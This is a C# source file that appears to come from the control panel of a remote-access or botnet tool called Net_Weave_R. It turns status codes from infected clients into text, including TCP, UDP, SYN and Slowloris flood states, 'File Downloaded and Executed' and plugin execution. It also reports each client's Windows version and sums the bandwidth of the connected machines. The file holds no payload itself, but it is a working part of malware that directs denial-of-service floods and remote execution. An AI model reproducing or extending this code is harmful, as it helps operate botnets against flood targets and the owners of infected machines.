using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using NetLib.Forms;
using System.Windows.Forms;

namespace Net_Weave_R.Core
{
    public enum Status : int
    {
        InvalidPassword = 0xF,

        FloodEnabled = 0,
        FloodDisabled = 1,
        FloodRunning = 2,
        Downloading = 3,
        Downloaded = 4,
        DownloadFailed = 5,
        Updating = 6,
        UpdateFailed = 7,
        PluginStored = 8,
        PluginExecuted = 9,
        PluginStarted = 11,
        PluginStopped = 12,
        PluginError = 13
    }
    public enum FloodTypes
    {
        TCP = 0,
        UDP = 1,
        SYN = 2,
        Slowloris = 3
    }
    class Parser
    {
        public static string GetStatus(int code, int code2)
        {
            switch (code)
            {
                case (int)Status.FloodEnabled:
                    return ((FloodTypes)code2).ToString() + " Flood Enabled";
                case (int)Status.FloodDisabled:
                    return ((FloodTypes)code2).ToString() + " Flood Disabled";
                case (int)Status.FloodRunning:
                    return ((FloodTypes)code2).ToString() + " Flood Already Enabled";
                case (int)Status.Downloading:
                    return "Downloading...";
                case (int)Status.Downloaded:
                    return "File Downloaded and Executed";
                case (int)Status.Updating:
                    return "Updating...";
                case (int)Status.PluginError:
                    switch (code2)
                    {
                        case 1:
                            return "Plugin Already Stored";
                        case 2:
                            return "XPlugin Not Found";
                        case 3:
                            return "Unknown Plugin Error";
                    }
                    break;
                    
            }

            return string.Empty;
        }

        public static string GetOS(string data)
        {
            string[] spl = data.Split('|');

            switch (spl[0])
            {
                case "4.1.2222":
                    spl[0] = "Windows 98";
                    break;
                case "4.1.2600":
                    spl[0] = "Windows 98 SE";
                    break;
                case "4.9.3000":
                    spl[0] = "Windows ME";
                    break;
                case "5.0.2195":
                    spl[0] = "Windows 2000";
                    break;
                case "5.1.2600":
                case "5.2.3790":
                    spl[0] = "Windows XP";
                    break;
                case "6.0.6000":
                case "6.0.6001":
                case "6.0.6002":
                case "6.0.6003":
                    spl[0] = "Windows Vista";
                    break;
                case "6.1.7600":
                case "6.1.7601":
                case "6.1.7602":
                case "6.1.7603":
                    spl[0] = "Windows 7";
                    break;
                default:
                    if (spl[0].StartsWith("6.2"))
                        spl[0] = "Windows 8";
                    else
                        spl[0] = "Unknown";
                    break;
            }

            if (spl[1] == "4")
                return spl[0] + " - x86";
            else if (spl[1] == "8")
                return spl[0] + " - x64";
            else
                return spl[0] + " - UKN";

        }

        public static string GetPluginStatus(Guid guid, int code, string add)
        {
            try
            {
                switch (code)
                {
                    case (int)Status.PluginStored:
                        return GlobalProperties.InitializedPlugins[guid].Name + ": Stored";
                    case (int)Status.PluginExecuted:
                        return GlobalProperties.InitializedPlugins[guid].Name + ": Executed";
                    case (int)Status.PluginStarted:
                        return GlobalProperties.InitializedPlugins[guid].Name + ": Started";
                    case (int)Status.PluginStopped:
                        return GlobalProperties.InitializedPlugins[guid].Name + ": Stopped";
                    case (int)Status.PluginError:
                        return GlobalProperties.InitializedPlugins[guid].Name + ": " + add;
                }
            }
            catch { }
            return "Plugin Not Found";
        }

        public static string GetTotalSpeed(List<Client> clients)
        {
            int total = 0;
            for (int i = 0; i < clients.Count; i++)
            {
                try
                {
                    if (clients[i] != null)
                    {
                        Client client = clients[i];
                        total += int.Parse(client.Lvi.SubItems[5].Text.Replace(" KB/SEC", ""));
                    }
                }
                catch { }
            }

            return Functions.FormatBytes(total * 1024);
        }
    }
}
